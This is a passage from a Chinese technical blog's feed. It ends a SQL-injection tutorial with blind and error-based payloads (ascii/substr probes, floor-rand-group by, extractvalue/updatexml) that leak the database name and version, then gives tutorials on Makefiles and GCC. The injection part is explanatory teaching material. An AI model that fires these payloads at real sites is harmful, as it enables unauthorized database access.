length(database()))&gt;4 //判断数据库名称的长度<br>id=1 and select ascii(substr(database(),1,1))&gt;119 //判断数据库名第一个字符的ascii码<br>基本上除了比注入麻烦好多以外没什么特别难的</p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入也是查询结果不给显示的时候使用的，主要依赖floor() extractvalue()(updatexml())函数</p><h2 id="floor-的报错注入"><a href="#floor-的报错注入" class="headerlink" title="floor()的报错注入"></a>floor()的报错注入</h2><p>准确地说应该是floor()、rand()、group by的报错注入。<br>我们看下面这句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from users group by x</span><br></pre></td></tr></table></figure><p>rand()函数的作用是随机生成一个0~1的数字，他还能接受一个seed的参数作为随机种子。rand(0)就是生成一个伪随机序列，自己试一下可以发现他是0110110。<br>而报错的主体是group by。<br>group by会形成一个虚拟表，首先以group by后面的表项作为主键，扫描select的每一个条目，将具有相同的主键的两个表项合并。这个过程对主键进行了两次运算。第一次是获取主键，第二次是向虚拟表中插入这个表项的时候。<br>在我们这个例子里，报错的过程大概是这样</p><ol><li>获取主键的名称，扫描users表的第一项，假设我们的数据库版本号是5.7.19，根据rand(0)的序列，x的值为<a href="mailto:0@5.7.19">0@5.7.19</a>（user只是单纯的提供我们能进行几次x的插入的工具表），此时虚拟表是空的，发现不存在这个条目，于是向其中添加一个条目，此时再次运算x的值为<a href="mailto:1@5.7.19">1@5.7.19</a>，那么此时这个虚拟表如下</li></ol><table><thead><tr><th>x</th><th>count(*)</th></tr></thead><tbody><tr><td><a href="mailto:1@5.7.19">1@5.7.19</a></td><td>count(*)</td></tr></tbody></table><ol start="2"><li>扫描下一个，获取主键，这里应该是<a href="mailto:1@5.7.19">1@5.7.19</a>，发现在表里有，因此表变为（count(*)函数是统计有多少行的，null也包含，实际上就是个占位的。主键是<a href="mailto:1@5.7.19">1@5.7.19</a>。）</li></ol><table><thead><tr><th>x</th><th align="right">count(*)</th></tr></thead><tbody><tr><td><a href="mailto:1@5.7.19">1@5.7.19</a></td><td align="right">count(*)</td></tr></tbody></table><p>3.再下一个，主键是<a href="mailto:0@5.7.19">0@5.7.19</a>，表内没有这个值，因此要插入<br><strong>但是</strong> ，插入表的时候再次计算得到x是<a href="mailto:1@5.7.19">1@5.7.19</a>，也就是要往表里再插入一条<a href="mailto:1@5.7.19">1@5.7.19</a>，count(*)的条目，由于主键是唯一的，所以必然会报错，这一条的结果也就返回了出来。</p><p>看到这里，相信大家都懂了，那么就有人要问了，万一我的user表不够长咋办啊？gnls你user表连三项都没有你这小破站是干啥的？那你去找个seed能生成0101或者1010序列的⑧</p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue() :对XML文档进行查询的函数，其实就是相当于我们熟悉的HTML文件中用 &lt;div&gt;&lt;p&gt;&lt;a&gt;标签查找元素一样。<br>语法：extractvalue(目标xml文档，xml路径)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>直接使用~/XXX的非法格式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username from security.user where id&#x3D;1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</span><br></pre></td></tr></table></figure><p>于是他就会报错返回想要的内容。<br>此外还有updatexml()函数有相同的用法，只要把xml路径改成不合法的格式即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username from security.user where id&#x3D;1 and (updatexml(‘anything’,concat(‘~’,(select database())),’anything’))</span><br></pre></td></tr></table></figure><p>参考<br><a href="https://blog.csdn.net/qq_41059320/article/details/89281125">https://blog.csdn.net/qq_41059320/article/details/89281125</a><br><a href="https://blog.csdn.net/he_and/article/details/80455884">https://blog.csdn.net/he_and/article/details/80455884</a><br><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;SQL注入漏洞作为臭名昭著的漏洞，已经有很多全自动攻击的工具了，但是我们是优秀的同学，我们要会用工具，还知道工具的原理。&lt;/p&gt;</summary>
    
    
    
    
    <category term="数据库" scheme="https://blog.pillar.fun/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Makefile</title>
    <link href="https://blog.pillar.fun/2020/03/07/Makefile/"/>
    <id>https://blog.pillar.fun/2020/03/07/Makefile/</id>
    <published>2020-03-07T02:38:40.000Z</published>
    <updated>2020-05-30T05:12:32.357Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>众所周知，一个程序从源码到可执行需要经过编译和链接两个步骤，而Makefile文件描述了整个工程的编译、链接规则。作为一个给力的Unix程序猿，必须要会写makefile嗷！</p><a id="more"></a><h1 id="编译、链接"><a href="#编译、链接" class="headerlink" title="编译、链接"></a>编译、链接</h1><p>以C和C++举例，对于一段源码，首先要进行<strong>编译</strong>的过程，将源码编译成为中间代码文件，在windows下后缀名为.obj，在UNIX下后缀名是.o。然后进行<strong>链接</strong>过程，将所有的中间代码连接起来。<br>编译时，编译器需要的是语法的正确，函数与变量的声明的正确。对于后者，通常是你需要告诉编译器头文件的所在位置（头文件中应该只是声明，而定义应该放在C/C++文件中），只要所有的语法正确，编译器就可以编译出中间目标文件。一般来说，每个源文件都应该对应于一个中间目标文件（O文件或是OBJ文件）。<br>链接时，主要是链接函数和全局变量，所以，我们可以使用这些中间目标文件（O文件或是OBJ文件）来链接我们的应用程序。链接器并不管函数所在的源文件，只管函数的中间目标文件（Object File），在大多数时候，由于源文件太多，编译生成的中间目标文件太多，而在链接时需要明显地指出中间目标文件名，这对于编译很不方便，所以，我们要给中间目标文件打个包，在Windows下这种包叫“库文件”（Library File)，也就是 .lib 文件，在UNIX下，是Archive File，也就是 .a 文件。</p><h1 id="一个多文件工程的例子"><a href="#一个多文件工程的例子" class="headerlink" title="一个多文件工程的例子"></a>一个多文件工程的例子</h1><p><img src="/2020/03/07/Makefile/TIM%E6%88%AA%E5%9B%BE20200305110722.jpg" alt><br>对于这个多文件工程，我们可以在命令行手动编译，另一种方式是编写Makefile。</p><h2 id="手动编译"><a href="#手动编译" class="headerlink" title="手动编译"></a>手动编译</h2><p>既然要编译，那显然要将所有的.c文件都编译一下，然后进行链接</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gcc</span> -c add/add_int.c -o add/add_int.o</span><br><span class="line"><span class="variable">$gcc</span> -c add/add_float.c -o add/add_float.o</span><br><span class="line"><span class="variable">$gcc</span> -c sub/sub_int.c -o sub/sub_int.o</span><br><span class="line"><span class="variable">$gcc</span> -c sub/sub_float.c -o sub/sub_float.o</span><br><span class="line"><span class="variable">$gcc</span> -c main.c -o main.o</span><br><span class="line"><span class="variable">$gcc</span> -o cacu add/add_int.o add/add_float.o sub/sub_int.o sub/sub_float.o main.o</span><br></pre></td></tr></table></figure><p>也可以用gcc的默认规则</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -o cacu add&#x2F;add_int.c add&#x2F;add_float.c sub&#x2F;sub_int.c sub&#x2F;sub_float.c main.c</span><br></pre></td></tr></table></figure><p>这里我们就不禁发出疑问，这gcc默认规则感觉简单又高效，为什么还要用makefile呢？<br>事实上，如果项目中的文件比较多，关系比较复杂，或者我们需要迭代版本修改自己的源代码的话，使用gcc命令行会变的很繁琐，于是我们就引入了makefile。</p><h2 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h2><p>我们是用make（cmake、nmake）警星项目管理的时候，需要一个makefile文件，make在编译的时候，从makefile中读取设置情况，运行相关规则。<br>比如对之前的那个项目我们建立一个如下的makefile</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cacu:add_int.o add_float.o sub_int.o sub_float.o main.o</span><br><span class="line">    gcc -o cacu add&#x2F;add_int.o add&#x2F;add_float.o \</span><br><span class="line">        sub&#x2F;sub_int.o sub&#x2F;sub_float.o main.o</span><br><span class="line">add_int.o:add&#x2F;add_int.c add&#x2F;add.h</span><br><span class="line">    gcc -c -o add&#x2F;add_int.o add&#x2F;add_int.c</span><br><span class="line">add_float.o:add&#x2F;add_float.c add&#x2F;add.h</span><br><span class="line">    gcc -c -o add&#x2F;add_float.o add.add_float.c</span><br><span class="line">sub_int.o:sub&#x2F;sub_int.c sub&#x2F;sub.h</span><br><span class="line">    gcc -c -o sub&#x2F;sub_int.o sub&#x2F;sub_int.c</span><br><span class="line">sub_float.o:sub&#x2F;sub_float.c sub&#x2F;sub.h</span><br><span class="line">    gcc -c -o sub&#x2F;sub_float.o sub&#x2F;sub_float.c</span><br><span class="line">main.o:main.c add&#x2F;add.h sub&#x2F;sub.h</span><br><span class="line">    gcc -c -o main.o main.c -Iadd -Isub</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">    rm -f cacu add&#x2F;add_int.o add&#x2F;add_float.o\</span><br><span class="line">        sub&#x2F;sub_int.o sub&#x2F;sub_float.o main.o</span><br></pre></td></tr></table></figure><p>在默认情况下会执行Makefile中的第一个规则，也就是cacu相关的规则，而cacu又依赖于多个目标文件，所以编译器会先生成依赖文件的.o</p><h1 id="makefile的规则"><a href="#makefile的规则" class="headerlink" title="makefile的规则"></a>makefile的规则</h1><p>makefile的框架是由规则构成的，而规则的基本格式是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TATGET... : DEPENDEDS...</span><br><span class="line">    COMMAND</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>TARGET:规则所定义的目标。通常规则是最后生成的可执行文件的文件名或者为了生成可执行文件而依赖的目标文件的文件名，也可以是一个动作，称之为“伪目标”<br>DEPENDS:执行此规则所必须的依赖条件，DEPENDS也可以是某个TARGET，形成嵌套<br>COMMAND:规则所执行的命令，例如编译文件、生成库文件、进入目录等等。动作可以是多个命令，每个命令占一行。</p><h2 id="规则的书写"><a href="#规则的书写" class="headerlink" title="规则的书写"></a>规则的书写</h2><p>为了使makefile更加清晰，要用反斜线将教程的行分解为多行。<br>命令必须以tab键开始，make程序吧出现在一条规则之后的所有连续的以tab键开始的行都作为命令处理。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>makefile可以是具体文件，也可以是动作，比如cacu就是生成cacu的规则，有很多依赖项及相关的命令动作。而clean是清楚当前生成文件的一个动作。</p><h2 id="文件时间戳"><a href="#文件时间戳" class="headerlink" title="文件时间戳"></a>文件时间戳</h2><p>make命令执行的时候会根据文件的时间戳判定是否执行相关命令。例如对main.c文件进行修改后保存，文件的生成日期就发生了改变，再次调用make命令编译的时候，就只会编译main.c，并且执行规则cacu，重新连接程序。</p><h2 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h2><p>在之前的makefile中，main.o的书写方式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main.o:main.c add&#x2F;add.h sub&#x2F;sub.h</span><br><span class="line">    gcc -c -o main.o main.c -Iadd -Isub</span><br></pre></td></tr></table></figure><p>有一种渐变的方法可以实现与上面相同的功能</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main.o:%o:%c</span><br><span class="line">    gcc -c $&lt; -o $@</span><br></pre></td></tr></table></figure><p>make命令允许对文件名进行类似正则运算的匹配，</p><h1 id="makefile中使用变量"><a href="#makefile中使用变量" class="headerlink" title="makefile中使用变量"></a>makefile中使用变量</h1><h2 id="makefile中的用户自定义变量"><a href="#makefile中的用户自定义变量" class="headerlink" title="makefile中的用户自定义变量"></a>makefile中的用户自定义变量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OBJS &#x3D; add&#x2F;add_int.o add&#x2F;add_float.o sub&#x2F;sub_int.o sub&#x2F;sub_float.o main.o</span><br></pre></td></tr></table></figure><p>用类似这样的代码来自定义用户变量，在使用时，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o cacu $(OBJS)</span><br></pre></td></tr></table></figure><h2 id="makefile中的预定义变量"><a href="#makefile中的预定义变量" class="headerlink" title="makefile中的预定义变量"></a>makefile中的预定义变量</h2><p>如表<br><img src="/2020/03/07/Makefile/TIM%E6%88%AA%E5%9B%BE20200307162847.jpg" alt></p><h2 id="makefile中常见的自动变量和含义"><a href="#makefile中常见的自动变量和含义" class="headerlink" title="makefile中常见的自动变量和含义"></a>makefile中常见的自动变量和含义</h2><p>如表<br><img src="/2020/03/07/Makefile/TIM%E6%88%AA%E5%9B%BE20200312192316.jpg" alt></p><h1 id="搜索路径"><a href="#搜索路径" class="headerlink" title="搜索路径"></a>搜索路径</h1><p>在打得系统中，通常存在很多目录，手动添加目录的方法不仅十分笨拙且容易造成错误。make存在一个目录搜索功能，make会自动找到指定文件的目录并且添加到文件上。使用方法入下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VPATH&#x3D;path1:path2:...</span><br></pre></td></tr></table></figure><p>VPATH右边是冒号分隔的路径名称</p><h1 id="递归make"><a href="#递归make" class="headerlink" title="递归make"></a>递归make</h1><p>递归make体现了makefile的模块化思想，每个模块各自make自己，而总程序可以调用他们的makefile来实现各个模块的功能，</p><h2 id="调用方式"><a href="#调用方式" class="headerlink" title="调用方式"></a>调用方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add:</span><br><span class="line">    cd add &amp;&amp; $(MAKE)</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add:</span><br><span class="line">    $(MAKE) -C add</span><br></pre></td></tr></table></figure><h2 id="总控makefile"><a href="#总控makefile" class="headerlink" title="总控makefile"></a>总控makefile</h2><p>调用$(MAKE) -C 的makefile 叫做总控makefile。如果总控makefile需要传递变量给下层的makefile，可以使用export命令<br>例如向下层makefile传递目标文件的导出路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export OBJSDIR&#x3D;.&#x2F;objs</span><br></pre></td></tr></table></figure><h1 id="makefile中的函数"><a href="#makefile中的函数" class="headerlink" title="makefile中的函数"></a>makefile中的函数</h1><h2 id="获取匹配模式的文件名-wildcard"><a href="#获取匹配模式的文件名-wildcard" class="headerlink" title="获取匹配模式的文件名 wildcard"></a>获取匹配模式的文件名 wildcard</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(wildcard PATTERN)</span><br></pre></td></tr></table></figure><p>返回当前目录下所有符合模式PATTERN的文件名</p><h2 id="模式替换函数-patsubst"><a href="#模式替换函数-patsubst" class="headerlink" title="模式替换函数 patsubst"></a>模式替换函数 patsubst</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(patsubst pattern,replacement,text)</span><br></pre></td></tr></table></figure><p>查找字符串text中按照空格分开的单词，将符合模式pattern的字符串替换成replacement。</p><h2 id="循环函数foreach"><a href="#循环函数foreach" class="headerlink" title="循环函数foreach"></a>循环函数foreach</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(foreach VAR,LIST,TEXT)</span><br></pre></td></tr></table></figure><p>将LIST字符串中一个空格分开的单词，先传给临时变量VAR，然后执行TEXT表达式，TEXT变道时处理结束后输出。其返回值是空格分表达式TEXT的计算结果。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;众所周知，一个程序从源码到可执行需要经过编译和链接两个步骤，而Makefile文件描述了整个工程的编译、链接规则。作为一个给力的Unix程序猿，必须要会写makefile嗷！&lt;/p&gt;</summary>
    
    
    
    
    <category term="工具" scheme="https://blog.pillar.fun/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="Linux" scheme="https://blog.pillar.fun/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>GCC</title>
    <link href="https://blog.pillar.fun/2020/03/05/gcc/"/>
    <id>https://blog.pillar.fun/2020/03/05/gcc/</id>
    <published>2020-03-05T02:39:50.000Z</published>
    <updated>2020-05-30T05:10:23.466Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>GCC是GNU Compiler Collection的缩写，包含gcc、g++等编译工具。这个工具不仅包含编译器，还包含其他工具集，例如ar、nm等。今天简单的讲一讲这个工具。</p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>GCC能编译C、C++、Objective-C、Fortran、Java、Ada等语言。GCC可以在不同的硬件平台编译，即支持交叉编译。<br>GCC的c编译器是gcc，其命令格式为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:gcc [options] file...</span><br></pre></td></tr></table></figure><p>GCC支持默认拓展名策略，下表是GCC下默认文件拓展名的含义。<br><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200305161017.jpg" alt><br>GCC常用的编译器有<br><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200305161056.jpg" alt><br>头文件和库文件的默认路径是<br><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200305161148.jpg" alt></p><h1 id="单个文件编译成执行文件"><a href="#单个文件编译成执行文件" class="headerlink" title="单个文件编译成执行文件"></a>单个文件编译成执行文件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc hello.c</span><br></pre></td></tr></table></figure><p>会在当前目录下自动生成文件名为a.out的可执行文件。<br>如果想要指定生成的可执行文件名，啧加一个-o参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -o hello hello.c</span><br></pre></td></tr></table></figure><p>此时就会出现一个叫hello的可执行文件。</p><h1 id="编译生成目标文件"><a href="#编译生成目标文件" class="headerlink" title="编译生成目标文件"></a>编译生成目标文件</h1><p>编译的过程分为如图所示<br><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200305162537.jpg" alt><br>源文件、目标文件和可执行文件是常用的三个词。源文件即是存放源代码的文件。目标文件是指经过了编译器的编译生成的二进制机器码，但是目标文件的一些函数过程没有相关的指示和说明，所以一般不可执行。可执行文件是目标文件与相关的库连接后的文件，它是可以执行的。<br>单个文件编译成可执行文件时，中间文件只在编译的过程中临时存在，在编译完成生成可执行文件之后，会删除掉目标文件。然而在大型项目中目标文件需要保留用于不同的编译目标。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -c (-o hello.o) hello.c</span><br></pre></td></tr></table></figure><p>GCC使用一个-c的选项来将源文件生成目标文件，而不是可执行文件，默认情况下生成的目标文件和源文件名称一样，拓展名为.o<br>如果要指定生成的目标文件的文件名，也是用-o的选项。<br>此外，可以用一条命令编译多个源文件。比如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -c file1.c file2.c file3.c</span><br></pre></td></tr></table></figure><h1 id="多文件编译"><a href="#多文件编译" class="headerlink" title="多文件编译"></a>多文件编译</h1><p>不管是目标文件还是源文件，都可以用同一个命令编译到一个可执行文件之中。<br>比如我们有一个add.c和一个main.c，在main.c里有对add.c的调用，我们直接执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -o test main.c add.c</span><br></pre></td></tr></table></figure><p>即可得到文件名为test的可执行文件。<br>当然我们也可以先把他们都编译成目标文件然后再链接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -c main.c</span><br><span class="line">$gcc -c add.c</span><br><span class="line">$gcc -o test main.o add.o</span><br></pre></td></tr></table></figure><p>甚至我们可以编译一个为目标文件，然后另一个为源文件使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -c main.c</span><br><span class="line">$gcc -o test main.o add.c</span><br></pre></td></tr></table></figure><p>都可以得到一个test的可执行文件。</p><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><p>在C语言程序中，一般会定义一些宏。预处理过程将源文件中的头文件包含进源文件，并且将文件中定义的宏进行脱焊<br>用下面的命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -E string.c</span><br></pre></td></tr></table></figure><p>会告诉编译器进行预编译操作，如果要修改文件名，那么同样是加上参数-o</p><h1 id="编译成汇编语言"><a href="#编译成汇编语言" class="headerlink" title="编译成汇编语言"></a>编译成汇编语言</h1><p>用下面的命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -S string.c</span><br></pre></td></tr></table></figure><p>编译string.c为汇编语言，文件名为string.s</p><h1 id="静态链接库"><a href="#静态链接库" class="headerlink" title="静态链接库"></a>静态链接库</h1><p>静态链接库是obj文件的一个集合，同城以.a为后缀。静态库由程序ar生成。由于多数程序在使用动态库，静态库已经不再常见。<br>静态库的有点是可以在我不用重新编译程序代码的情况下，进行程序的重新链接，在编译大型程序的时候，这样可以节省很可观的时间。此外，静态库使开发者可以提供库文件给使用的人员，而不用开放源代码。<br>理论上，静态库的执行速度比动态库和共享库快1%到5%。</p><h2 id="生成静态链接库"><a href="#生成静态链接库" class="headerlink" title="生成静态链接库"></a>生成静态链接库</h2><p>使用下面的命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ar -rcs libstr.a string.o</span><br></pre></td></tr></table></figure><p>使用工具ar将string.o打包为库文件libstr.a<br>使用下面的命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ar 库文件名 obj文件1 obj文件2</span><br></pre></td></tr></table></figure><p>来生成静态库或者将obj文件加到静态库里。</p><h2 id="使用静态链接库"><a href="#使用静态链接库" class="headerlink" title="使用静态链接库"></a>使用静态链接库</h2><p>只需要在gcc的文件里加上.a文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -o test main.c libstr.a</span><br></pre></td></tr></table></figure><p>也可以使用命令-l 库名，库名时不包含函数库和拓展名的字符串。例如libstr.a的库名就是<del>lib</del>str<del>.a</del></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -o test main.c -lstr</span><br></pre></td></tr></table></figure><p>上面的命令将在系统默认的路径下查找str函数库。可能系统会提示无法找到库文件str，这是由于str不在默认路径下。我们可以用-L的参数来指定路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -o test main.c -L.&#x2F; -lstr</span><br></pre></td></tr></table></figure><p>是当库文件和当前编译文件在同一目录下。</p><h1 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h1><p>动态链接库中存放的是目标文件，和静态链接库相比，目标文件在动态链接库中的函数和变量的地址是相对地址而不是绝对地址，真实地址在调用动态库的程序加载时形成。<br>动态链接库的名称有 别名(soname)，真名(realname)，和链接名(linker name)。别名形如libXX.so其中XX是库名。真名一般是别名价格小版本号或者发布版本。连接名是程序链接时使用的库的名字。动态链接库安装的时候，总是赋值库文件到某个目录下，然后用一个软连接生成别名，在库文件进行更新的视乎，仅仅更新软连接即可。</p><h2 id="生成动态链接库"><a href="#生成动态链接库" class="headerlink" title="生成动态链接库"></a>生成动态链接库</h2><p>使用-fPIC选项或者-fpic选项，使gcc生成的代码是位置无关的，这样就能生成一个动态链接库。例如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -shared -Wl,-soname,libstr.so -o libstr.so.1 string.c</span><br></pre></td></tr></table></figure><p>-share告诉编译器生成一个动态链接库<br>-Wl告诉编译器后面的参数传递给链接器<br>-soname指定了动态库的soname<br>-o指定了动态库的真名</p><h2 id="动态链接库的配置"><a href="#动态链接库的配置" class="headerlink" title="动态链接库的配置"></a>动态链接库的配置</h2><p>动态链接库的使用需要指定系的动态链接库搜索路径，让系统找到运行所需要的动态链接库才行。/etc/ld.so.conf是动态链接库的搜索路径配置文件，里面存放着动态链接库所在目录的名字。</p><h2 id="动态链接库的管理命令"><a href="#动态链接库的管理命令" class="headerlink" title="动态链接库的管理命令"></a>动态链接库的管理命令</h2><p>ldconfig命令让新增加的动态链接库能够被系统共享。它可以在系统默认的搜索路径和动态链接库的配置文件中列出的目录中搜索动态链接库，创建动态链接装入程序需要的链接和缓存文件，搜索完毕后将结果写入/etc/ld.so.chche缓存文件。<br>ldconfig的用法如下，选项含义见表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldconfig [-v|--verbose] [-n] [-N] [-X] [-f CONF] [-C CACHE] [-r ROOT] [-l] [-p|--print-cache] [-c FORMAT] [-V] [-?|--help|--suage] path...</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200306120956.jpg" alt></p><h2 id="使用动态链接库"><a href="#使用动态链接库" class="headerlink" title="使用动态链接库"></a>使用动态链接库</h2><p>同使用静态链接库，使用”-l 库名”的方式引入动态链接库<br><strong>注意</strong> 实际上，在编译过程中也可以用L来指定动态链接库的路径，并且编译不会报错，但是在运行时则会出现无法加载动态链接库的报错。这是因为不同于静态链接库将整个库的目标文件一并写入可执行程序，动态链接库只提供一个动态链接库的库名，程序在执行时，会根据我们系统目录中保存的库名和路径去装载动态链接库内的函数，并且 <strong>如果有多个程序调用同一个库，在内存中值装载一份该共享库的实例。</strong><br>此外还要注意，如果系统的搜索路径下同时存在静态链接库和动态链接库，默认情况下会链接动态链接库，如果需要强制链接静态链接库，需要加上“-static”选项。</p><h1 id="动态加载库"><a href="#动态加载库" class="headerlink" title="动态加载库"></a>动态加载库</h1><p>动态加载库类似于动态链接库，区别在于，动态链接库在程序启动时加载（load），而动态加载库则可以利用程序的方法来控制什么时候加载。动态加载库主要有dlopen()、dlerror()、dlsym()和dlclose()s。</p><h2 id="dlopen"><a href="#dlopen" class="headerlink" title="dlopen()"></a>dlopen()</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void * dlopen(const char *filename, int flag);</span><br></pre></td></tr></table></figure><p>按照用户指定的方式打开动态链接库，其中参数filename为动态链接库的文件名，flag为打开方式，一般为RTLD_LASY，函数的返回值是库的指针。</p><h2 id="dlsym"><a href="#dlsym" class="headerlink" title="dlsym()"></a>dlsym()</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void * dlsym(void *handle, char *symbol)</span><br></pre></td></tr></table></figure><p>获取动态链接库中指定的函数指针，然后可以用这个函数指针进行操作。handle为dlopen()打开库后返回的句柄，symbol为函数名称，返回值为函数指针。</p><h1 id="GCC常用选项"><a href="#GCC常用选项" class="headerlink" title="GCC常用选项"></a>GCC常用选项</h1><p>在代码段里如果有</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#if def MACRO</span><br><span class="line">...</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>那么</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -D MACRO</span><br></pre></td></tr></table></figure><p>就可以指定这段被执行。<br>此外还有<br>-I dir：将头文件搜索路径扩大，包含dir目录<br>-L dir：将链接时使用的链接库搜索路径扩大，包含dir目录。<br>-static：使用静态库链接，gcc会优先使用动态库<br>-g：包括调试信息</p><p>-On：优化程序，程序优化后执行速度会更快。n一般意义如下<br>-O0：关闭所有优化选项<br>-O1：基本优化，编译器会生成更快的代码<br>-O2：-O1的升级版，推荐使用<br>-O3：这是目前最高的优化级别，它会使用更多的编译时间，虽然它生成的代码只会比-O2块一点点（GCC3.x中是这样的，但是在GCC4.x中有时候可能还没有-O2快），但是它会增大二进制文件的体积并让他们更消耗内存，因此在GCC4.x中-O3是不推荐的。<br>-Os:这个级别是用来优化代码尺寸的，他只是给一些CPU缓存或是磁盘空间小的机器使用<br>-Ofast:<br>该选项将不会严格遵循语言标准，除了启用所有的-O3优化选项之外，也会针对某些语言启用部分优化。如：-ffast-math ，对于Fortran语言，还会启用下列选项：<br>-fno-protect-parens<br>-fstack-arrays<br>-Og:<br>该标识会精心挑选部分与-g选项不冲突的优化选项，当然就能提供合理的优化水平，同时产生较好的可调试信息和对语言标准的遵循程度。</p><p>-W all：打开所有gcc能够提供的，常用的警告信息。<br>下表示具体的含义<br><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200306170344.jpg" alt><br><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200306170358.jpg" alt><br><img src="/2020/03/05/gcc/TIM%E6%88%AA%E5%9B%BE20200306170412.jpg" alt></p><p>参考：<br><a href="https://blog.csdn.net/hxxjxw/article/details/89670302?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/hxxjxw/article/details/89670302?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>]]></content>
    
    
